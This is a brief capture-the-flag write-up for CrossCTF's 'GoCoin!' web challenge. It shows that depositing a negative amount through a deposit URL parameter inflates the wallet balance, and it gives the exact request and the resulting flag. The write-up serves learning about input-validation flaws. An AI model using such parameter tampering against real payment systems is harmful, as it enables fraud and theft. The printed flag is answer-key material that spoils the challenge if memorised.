# GoCoin!
Web - 50 points

## Challenge 

> I thought blockchain was cool, so I made my own coin.

> http://ctf.pwn.sg:8182

> Creator - quanyang (@quanyang)

## Solution

We see this on the website

	You have 1 GoCoins! in your wallet and 0 in your bank!
	Deposit 1 GoCoins into your bank here!
	Withdraw 1 GoCoins from your bank here!
	Buy a flag for 1.337 GoCoins! here.

Deposit a negative amount and we can buy the flag.

> http://ctf.pwn.sg:8182/deposit?amount=-100

	You deposited -100 GoCoins! into your bank!
	You have 101 GoCoins! in your wallet and -100 in your bank!
	Deposit 1 GoCoins into your bank here!
	Withdraw 1 GoCoins from your bank here!
	Buy a flag for 1.337 GoCoins! here.

## Flag

	You bought a flag!

	CrossCTF{G0C0in_Is_Th3_Nex7_Bi5_Th@ng!}